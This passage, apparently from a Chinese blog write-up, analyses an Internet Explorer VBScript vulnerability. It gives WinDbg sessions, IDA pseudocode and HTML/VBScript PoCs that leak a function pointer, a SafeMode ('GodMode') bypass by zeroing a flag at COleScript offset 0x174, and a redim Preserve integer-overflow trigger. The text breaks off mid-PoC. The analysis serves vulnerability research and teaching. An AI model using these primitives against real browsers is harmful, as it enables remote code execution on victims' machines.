<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:012&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:012&gt; g</span><br><span class="line">Tue Jun 25 21:53:09.006 2019 (GMT+8): ModLoad: 6b650000 6b6bb000   C:\Windows\system32\vbscript.dll</span><br><span class="line">Tue Jun 25 21:53:09.006 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6b65185c ebx=022fd034 ecx=6b6aa9d8 edx=022fcfac esi=01fc9a60 edi=00000001</span><br><span class="line">eip=6b66c206 esp=022fcec8 ebp=022fced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6b66c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0027fe50  00000008 00000000 01fc9a44 01fc97f4</span><br><span class="line">0:005&gt; du 01fc9a44</span><br><span class="line">01fc9a44  &quot;AssignVar&quot;</span><br><span class="line">0:005&gt; bu vbscript!Assignvar</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 21:56:14.381 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0027fe60 ebx=022fd034 ecx=022fd034 edx=00000010 esi=01fc9a60 edi=00000010</span><br><span class="line">eip=6b652e64 esp=022fcee0 ebp=022fcfdc iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vbscript!AssignVar:</span><br><span class="line">6b652e64 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0027fe50  00000003 00000000 87654321 01fc97f4</span><br></pre></td></tr></table></figure>

<p>可以看到，在第一个断点<code>IsEmpty</code>处，求值栈栈顶地址为<code>0x0027fe50</code>,栈上对象类型为<code>0x8</code>,<code>VT_BSTR</code>。当在第二次断点时，栈顶对象类型变成了<code>0x3</code>，为<code>VT_I4</code>类型。对应的值即为poc中的<code>0x87654321</code>。</p>
<p>在vbscript中，无法获取函数指针的，但是当尝试把函数地址赋值给变量是，求值栈会发生神奇的事情。调试如下poc:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    sub func()</span><br><span class="line">    end sub</span><br><span class="line"></span><br><span class="line">    IsEmpty("test")</span><br><span class="line">    i = func</span><br><span class="line">    i = null</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:012&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:012&gt; g</span><br><span class="line">Tue Jun 25 22:45:29.396 2019 (GMT+8): ModLoad: 6b6f0000 6b75b000   C:\Windows\system32\vbscript.dll</span><br><span class="line">Tue Jun 25 22:45:29.396 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6b6f185c ebx=023fd6d4 ecx=6b74a9d8 edx=023fd64c esi=00d7a8d8 edi=00000001</span><br><span class="line">eip=6b70c206 esp=023fd568 ebp=023fd578 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6b70c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0052fe50  00000008 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; du 00d7a8c4</span><br><span class="line">00d7a8c4  &quot;test&quot;</span><br><span class="line">0:005&gt; ba w4 0052fe50</span><br><span class="line">0:005&gt; ba w4 0052fe50+8</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:46:27.584 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0052fe50 ebx=023fd6d4 ecx=00000000 edx=0000400c esi=00d7a8b0 edi=00000010</span><br><span class="line">eip=6b6f322c esp=023fd594 ebp=023fd67c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!CScriptRuntime::RunNoEH+0xeaf:</span><br><span class="line">6b6f322c 8d4594          lea     eax,[ebp-6Ch]</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  00000000 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:46:53.012 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=00000000 ebx=023fd704 ecx=0052f448 edx=00d7a8b8 esi=0052f610 edi=0052fe54</span><br><span class="line">eip=6b6f2b24 esp=023fd52c ebp=023fd534 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!NameTbl::GetAdrCore+0x2b:</span><br><span class="line">6b6f2b24 a5              movs    dword ptr es:[edi],dword ptr [esi] es:0023:0052fe54=00000000 ds:0023:0052f610=000007ff</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  0000004c 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:47:07.785 2019 (GMT+8): Breakpoint 2 hit</span><br><span class="line">eax=00000000 ebx=023fd704 ecx=0052f448 edx=00d7a8b8 esi=0052f618 edi=0052fe5c</span><br><span class="line">eip=6b6f2b26 esp=023fd52c ebp=023fd534 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!NameTbl::GetAdrCore+0x2d:</span><br><span class="line">6b6f2b26 a5              movs    dword ptr es:[edi],dword ptr [esi] es:0023:0052fe5c=00000000 ds:0023:0052f618=f60000f6</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  0000004c 000007ff 0052fe98 00000000</span><br><span class="line">0:005&gt; dd 0052fe98 l4</span><br><span class="line">0052fe98  6b6f4934 00000001 0052f7a8 00d7a878</span><br><span class="line">0:005&gt; ln 6b6f4934</span><br><span class="line">(6b6f4934)   vbscript!CScriptEntryPoint::`vftable&apos;   |  (6b70ab54)   vbscript!CEntryPointDispatch::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!CScriptEntryPoint::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; dd poi(poi(0052fe98+0x8)+0x10) l4</span><br><span class="line">0052f100  6b6f4868 6b6f4ab4 6b6f4410 6b6f43f8</span><br><span class="line">0:005&gt; ln 6b6f4868</span><br><span class="line">(6b6f4868)   vbscript!COleScript::`vftable&apos;   |  (6b70fdbc)   vbscript!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!COleScript::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:51:28.415 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0052fe50 ebx=023fd6d4 ecx=00000001 edx=023fd540 esi=00000000 edi=80020102</span><br><span class="line">eip=6b6f3faf esp=023fd594 ebp=023fd67c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!CScriptRuntime::RunNoEH+0x79d:</span><br><span class="line">6b6f3faf e99ce8ffff      jmp     vbscript!CScriptRuntime::RunNoEH+0x156 (6b6f2850)</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  00000001 000007ff 0052fe98 f60000f6</span><br></pre></td></tr></table></figure>

<p>调试时，通过<code>IsEmpty</code>找到当前求值栈的栈顶地址为<code>0x0052fe50</code>,此时栈顶存放的<code>VARIANT</code>类型为<code>0x8</code> <code>VT_BSTR</code>，数据段存放的是”func”字符串的地址。随后对求值栈的类型字段和数据段下写断点<code>ba w4 0046fbb8</code>, <code>ba w4 0046fbb8+8</code>.在执行到<code>i=func</code>时，解释器会先获取<code>func</code>函数的地址，然后封装成<code>VARIANT</code>类型放到求值栈上，可以看到<code>0x4c</code>对应的类型为<code>VT_FUNC</code>。随后准备进行赋值操作，但是在赋值检查类型时，发现求值栈中的是函数地址，会直接返回错误，不会执行赋值操作。但poc中又设置了<code>On Error Resume Next</code>，所以会向下继续执行<code>i=null</code>。 而在准备<code>null</code>的<code>VARIANT</code>类型时，解释器并不是将新封装的<code>VARIANT</code>类型放到求值栈中，而仅仅是将求值栈里面的类型域修改成了<code>VT_NULL</code>，<code>0x1</code>，然后赋值给<code>i</code>。数据域中依然保留的是<code>func</code>的地址。最终变量<code>i</code>保存了<code>func</code>函数的地址。而通过观察发现，该地址其实是<code>CScriptEntryPoint</code>对象的指针。</p>
<h3 id="6-SafeMode-GodMode"><a href="#6-SafeMode-GodMode" class="headerlink" title="6. SafeMode(GodMode)"></a>6. SafeMode(GodMode)</h3><p>SafeMode 是 Windows 操作系统中针对安全的一种特殊模式，即安全模式。在 vbscript 引擎中同样存在这样一个安全属性值，正常情况下该属性值为 <code>0xE</code>。默认情况下 vbscript 脚本执行权限是非常低的，正是因为safemode 安全属性的限制，如若我们能通过一定方法修改掉此属性值（改为 0 或者 4），即可绕过安全权限检查，为所欲为，即进入上帝模式。而且，经过调试发现在 <code>COleScript</code> 对象偏移 <code>0x174</code>(不同版本可能偏移不一样) 位置正是 SafeMode标志位(结论记住就行，前人逆向出来的经验)。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span></span><br><span class="line">    on error resume next</span><br><span class="line">    set shell = createobject("shell.application")</span><br><span class="line">    shell.shellexecute "powershell.exe"</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常情况下，上面poc是无法弹出<code>powershell.exe</code>的。在 IE 中打开，使用 windbg 附加进程后调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!COleSCript::InSafeMode</span><br><span class="line">0:005&gt; g</span><br><span class="line">Fri Jun 21 16:39:37.292 2019 (GMT+8): Breakpoint 3 hit</span><br><span class="line">eax=75af0782 ebx=00000000 ecx=02247740 edx=75ae0000 esi=02249828 edi=00000000</span><br><span class="line">eip=6c71ce4d esp=0223cef8 ebp=0223cf80 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vbscript!COleScript::InSafeMode:</span><br><span class="line">6c71ce4d f781740100000b000000 test dword ptr [ecx+174h],0Bh ds:0023:022478b4=0000000e</span><br><span class="line">0:005&gt; dd ecx+174 L4</span><br><span class="line">022478b4  0000000e 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:005&gt; eb ecx+174 0</span><br><span class="line">0:005&gt; dd ecx+174 L4</span><br><span class="line">022478b4  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>可以看到，在 <code>InSafeMode</code> 函数中，会检查 <code>0x174</code> 偏移处的值与 <code>0xB(1011)</code> 的 <strong>与</strong> 结果。如果结果为 <code>0</code>， 则vbscript的执行将不再收到限制。故此时值应该为 <code>0</code> 或者 <code>4(0100)</code> 才行。手动在调试器中修改内存值，便可弹出cmd。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p>先看一个简化版的poc:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim arrayA()</span><br><span class="line">    dim arrayB()</span><br><span class="line">    dim size</span><br><span class="line">    dim over</span><br><span class="line">    size = &amp;h5</span><br><span class="line">    over = &amp;h8000000 + size</span><br><span class="line">    redim Preserve arrayA(size)</span><br><span class="line"></span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line"></span><br><span class="line">    redim arrayB(size)</span><br><span class="line">    redim Preserve arrayA(over)</span><br><span class="line">    arrayA(size+1) = 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>windbg 打开堆调试开关：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;gflags.exe /i iexplore.exe +hpa -ust</span><br><span class="line">Current Registry Settings for iexplore.exe executable are: 02000000</span><br><span class="line">    hpa - Enable page heap</span><br></pre></td></tr></table></figure>

<p>IE 运行 poc 时用windbg 附加上，可以看到崩溃信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Mon Jun 24 11:06:29.036 2019 (GMT+8): (86c.848): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=0000400c ebx=04ea7000 ecx=0000400c edx=00000002 esi=00000010 edi=00000001</span><br><span class="line">eip=68512e78 esp=041bcfd4 ebp=041bcffc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">vbscript!AssignVar+0x14:</span><br><span class="line">68512e78 66390b          cmp     word ptr [ebx],cx        ds:0023:04ea7000=????</span><br><span class="line"></span><br><span class="line">vbscript!AssignVar:</span><br><span class="line">68512e64 8bff            mov     edi,edi</span><br><span class="line">68512e66 55              push    ebp</span><br><span class="line">68512e67 8bec            mov     ebp,esp</span><br><span class="line">68512e69 83ec20          sub     esp,20h</span><br><span class="line">68512e6c 53              push    ebx</span><br><span class="line">68512e6d 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]</span><br><span class="line">68512e70 b80c400000      mov     eax,400Ch</span><br><span class="line">68512e75 8bc8            mov     ecx,eax</span><br><span class="line">68512e77 56              push    esi</span><br><span class="line">68512e78 66390b          cmp     word ptr [ebx],cx        ds:0023:04ea7000=????</span><br><span class="line">68512e7b 0f841f9f0000    je      vbscript!AssignVar+0x19 (6851cda0)</span><br></pre></td></tr></table></figure>

<p>可以看到，执行到 <code>eip=68512e78</code> 时，在读取<code>ebx</code>指向的内存时出错。查看 <code>ebx</code> 指向的内存是如何申请的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a ebx</span><br><span class="line">    address 04ea7000 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1f1000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 4dd14e0:          4ea6ef0              110 -          4ea6000             2000</span><br><span class="line">    6d178e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    6d1792b2 verifier!AVrfDebugPageHeapReAllocate+0x000001a2</span><br><span class="line">    77796153 ntdll!RtlDebugReAllocateHeap+0x00000033</span><br><span class="line">    7775e46c ntdll!RtlReAllocateHeap+0x00000054</span><br><span class="line">    775aee32 ole32!CRetailMalloc_Realloc+0x00000025</span><br><span class="line">    7784ed3c OLEAUT32!SafeArrayRedim+0x00000153</span><br><span class="line">    685258da vbscript!RedimPreserveArray+0x00000081</span><br><span class="line">    68525887 vbscript!CScriptRuntime::RunNoEH+0x00001466</span><br><span class="line">    68514ff6 vbscript!CScriptRuntime::Run+0x00000064</span><br><span class="line">    68514f79 vbscript!CScriptEntryPoint::Call+0x00000051</span><br><span class="line">    6851512b vbscript!CSession::Execute+0x000000c8</span><br><span class="line">    6851536e vbscript!COleScript::ExecutePendingScripts+0x00000146</span><br><span class="line">    68520e4a vbscript!COleScript::ParseScriptTextCore+0x00000247</span><br><span class="line">    685193e8 vbscript!COleScript::ParseScriptText+0x0000002b</span><br></pre></td></tr></table></figure>

<p>通过<code>!heap -p -a ebx</code> 可以看到是 <code>vbscript!RedimPreserveArray</code> 申请到的。上 IDA 分析 <code>vbscript.dll</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">RedimPreserveArray</span><span class="params">(SAFEARRAY *psa, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, struct VAR *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SAFEARRAY *v3; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 *v4; <span class="comment">// eax@3</span></span><br><span class="line">  VAR *v5; <span class="comment">// edi@6</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// esi@6</span></span><br><span class="line">  __int32 v7; <span class="comment">// [sp-10h] [bp-20h]@0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">VAR</span> *<span class="title">v8</span>;</span> <span class="comment">// [sp-Ch] [bp-1Ch]@0</span></span><br><span class="line">  SAFEARRAYBOUND psaboundNew; <span class="comment">// [sp+8h] [bp-8h]@2</span></span><br><span class="line">  SAFEARRAY *psaa; <span class="comment">// [sp+18h] [bp+8h]@2</span></span><br><span class="line"></span><br><span class="line">  v3 = psa;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != psa-&gt;cDims )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  psaboundNew.lLbound = <span class="number">0</span>;</span><br><span class="line">  psaboundNew.cElements = *((_DWORD *)VAR::PvarGetTypeVal(a3, <span class="number">3</span>) + <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">  psaa = (SAFEARRAY *)<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (struct VAR *)((<span class="keyword">char</span> *)a3 + <span class="number">16</span>);</span><br><span class="line">    v6 = (<span class="keyword">int</span>)&amp;v3[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> ( !*(_DWORD *)(v6 + <span class="number">4</span>) &amp;&amp; *(_DWORD *)v6 == *((_DWORD *)VAR::PvarGetTypeVal(v5, <span class="number">3</span>) + <span class="number">2</span>) + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      psaa = (SAFEARRAY *)((<span class="keyword">char</span> *)psaa + <span class="number">1</span>);</span><br><span class="line">      v6 += <span class="number">8</span>;</span><br><span class="line">      v5 = (VAR *)((<span class="keyword">char</span> *)v5 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)psaa &gt;= a2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">    RaiseErrorHr(<span class="number">-2146828279</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_3:</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 *)SafeArrayRedim(v3, &amp;psaboundNew);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v4 &lt; <span class="number">0</span> )</span><br><span class="line">    RaiseErrorHr(v7, v8, v4, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过分析，在函数 <code>RedimPreserveArray</code> 中又调用 <code>aoleaut32</code> 模块中的 <code>SafeArrayRedim</code>函数。其中，<code>v3</code> 也就是 <code>psa</code>类型为 <code>SAFEARRAY</code>, 表示带调整的数组，<code>psaboundNew</code>类型为 <code>SAFEARRAYBOUND</code>，表示待调整的数组大小。</p>
<p>关闭之前开启的堆调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;gflags.exe /i iexplore.exe -hpa</span><br><span class="line">Current Registry Settings for iexplore.exe executable are: 00000000</span><br></pre></td></tr></table></figure>

<p>修改下之前的POC，增加<code>IsEmpty</code>用于辅助调试：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim arrayA()</span><br><span class="line">    dim arrayB()</span><br><span class="line">    dim size</span><br><span class="line">    dim over</span><br><span class="line">    size = &amp;h5</span><br><span class="line">    over = &amp;h8000000 + size</span><br><span class="line">    redim Preserve arrayA(size)</span><br><span class="line"></span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line"></span><br><span class="line">    redim arrayB(size)</span><br><span class="line">    redim Preserve arrayA(over)</span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line">    arrayA(size+1) = 